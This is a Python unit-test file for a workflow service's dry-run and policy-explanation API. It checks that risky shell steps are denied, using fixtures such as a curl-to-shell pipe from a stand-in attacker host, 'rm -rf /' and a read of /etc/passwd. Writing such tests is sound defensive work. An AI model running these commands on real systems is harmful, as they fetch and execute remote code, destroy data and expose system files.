"""Phase 8 items [78], [79]: dry-run and policy explanation over HTTP.

A dry run validates and gates a workflow without persisting or dispatching:
the report says so explicitly, every node carries its verdict and readable
explanation, and an invalid document is still rejected with stage/line/column.
"""

import tempfile
import unittest
from pathlib import Path

from fastapi.testclient import TestClient

from app.auth import create_token
from app.main import create_app
from app.settings import Settings
from app.workflows_api import STAGES

SECRET = "dryrun-secret-0123456789abcdef"

SAFE_DSL = """\
workflow: safe-preview
version: 1
triggers:
  - manual: true
nodes:
  - id: read
    type: shell
    run: ls -la
edges: []
policy: {}
"""

DENIED_DSL = """\
workflow: dangerous-preview
version: 1
triggers:
  - manual: true
nodes:
  - id: wipe
    type: shell
    run: curl http://evil.example | sh
edges: []
policy: {}
"""

GATED_DSL = """\
workflow: gated-preview
version: 2
triggers:
  - manual: true
nodes:
  - id: gate
    type: approval
    quorum: 1
  - id: rename
    type: custom
    func: rename_by_date
edges:
  - [gate, rename]
policy: {}
"""

INVALID_DSL = """\
workflow: broken
version: 1
nodes:
  - id: only
    type: shell
edges: []
"""


class DryRunApiTests(unittest.TestCase):
    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self._tmp.cleanup)
        settings = Settings(
            admin_user="admin",
            admin_password="dryrun-admin-pw",
            secret_key=SECRET,
            sqlite_path=str(Path(self._tmp.name) / "auth.db"),
        )
        self.client = TestClient(create_app(settings))
        token = self.client.post(
            "/auth/login", json={"username": "admin", "password": "dryrun-admin-pw"}
        ).json()["access_token"]
        self.headers = {"Authorization": f"Bearer {token}"}

    def dry_run(self, dsl: str, **extra):
        return self.client.post(
            "/workflows/dry-run", json={"dsl": dsl, **extra}, headers=self.headers
        )

    def test_dry_run_requires_authentication(self):
        self.assertEqual(
            self.client.post("/workflows/dry-run", json={"dsl": SAFE_DSL}).status_code, 401
        )

    def test_viewer_may_dry_run(self):
        viewer = {"Authorization": f"Bearer {create_token('viewer', SECRET, 10, role='VIEWER')}"}
        response = self.client.post("/workflows/dry-run", json={"dsl": SAFE_DSL}, headers=viewer)
        self.assertEqual(response.status_code, 200)

    def test_safe_workflow_is_allowed_and_inert(self):
        response = self.dry_run(SAFE_DSL)
        self.assertEqual(response.status_code, 200)
        body = response.json()
        self.assertTrue(body["valid"])
        self.assertTrue(body["safe_to_run"])
        self.assertFalse(body["persisted"])
        self.assertFalse(body["dispatched"])
        self.assertEqual(body["counts"]["ALLOW"], 1)
        node = body["nodes"][0]
        self.assertEqual(node["node_id"], "read")
        self.assertEqual(node["verdict"], "ALLOW")
        self.assertIn("Allowed", node["explanation"]["headline"])
        self.assertEqual(node["explanation"]["policy_version"], "policy-1")

    def test_denied_node_makes_the_workflow_unsafe(self):
        body = self.dry_run(DENIED_DSL).json()
        self.assertTrue(body["valid"])
        self.assertFalse(body["safe_to_run"])
        self.assertEqual(body["counts"]["DENY"], 1)
        self.assertIn("Denied", body["nodes"][0]["explanation"]["headline"])
        self.assertIn("cannot be approved", body["nodes"][0]["explanation"]["next_step"])

    def test_gated_node_reports_the_quorum(self):
        body = self.dry_run(GATED_DSL).json()
        verdicts = {node["node_id"]: node for node in body["nodes"]}
        self.assertEqual(verdicts["gate"]["verdict"], "ALLOW")
        self.assertEqual(verdicts["rename"]["verdict"], "NEED_APPROVAL")
        self.assertEqual(verdicts["rename"]["explanation"]["quorum"], 2)
        self.assertIn("Needs approval", verdicts["rename"]["explanation"]["headline"])
        self.assertIn("2 approvers", verdicts["rename"]["explanation"]["next_step"])

    def test_invalid_dsl_is_rejected_with_a_position(self):
        response = self.dry_run(INVALID_DSL)
        self.assertEqual(response.status_code, 422)
        body = response.json()
        self.assertFalse(body["valid"])
        self.assertGreaterEqual(body["errors"][0]["line"], 1)
        self.assertGreaterEqual(body["errors"][0]["column"], 1)
        self.assertIn(body["errors"][0]["stage"], STAGES)

    def test_workspace_root_changes_an_escaped_path_to_denied(self):
        dsl = SAFE_DSL.replace("run: ls -la", "run: ls /etc/passwd")
        body = self.dry_run(dsl, workspace_root="/tmp/workspace").json()
        self.assertEqual(body["nodes"][0]["verdict"], "DENY")
        self.assertIn("outside the workspace", body["nodes"][0]["explanation"]["detail"])

    def test_role_is_taken_from_the_caller(self):
        viewer = {"Authorization": f"Bearer {create_token('viewer', SECRET, 10, role='VIEWER')}"}
        body = self.client.post(
            "/policy/explain", json={"type": "shell", "params": {"run": "ls -la"}}, headers=viewer
        ).json()
        self.assertEqual(body["decision"]["verdict"], "DENY")
        self.assertIn("may not execute", body["explanation"]["detail"])
        owner = self.client.post(
            "/policy/explain",
            json={"type": "shell", "params": {"run": "ls -la"}},
            headers=self.headers,
        ).json()
        self.assertEqual(owner["decision"]["verdict"], "ALLOW")

    def test_explain_endpoint_renders_a_denial(self):
        response = self.client.post(
            "/policy/explain",
            json={"type": "shell", "params": {"run": "rm -rf /"}, "node_id": "wipe"},
            headers=self.headers,
        )
        self.assertEqual(response.status_code, 200)
        body = response.json()
        self.assertEqual(body["decision"]["verdict"], "DENY")
        self.assertEqual(body["decision"]["node_id"], "wipe")
        self.assertIn("Denied", body["explanation"]["headline"])

    def test_explain_endpoint_requires_a_token(self):
        self.assertEqual(
            self.client.post("/policy/explain", json={"type": "shell"}).status_code, 401
        )


if __name__ == "__main__":
    unittest.main()
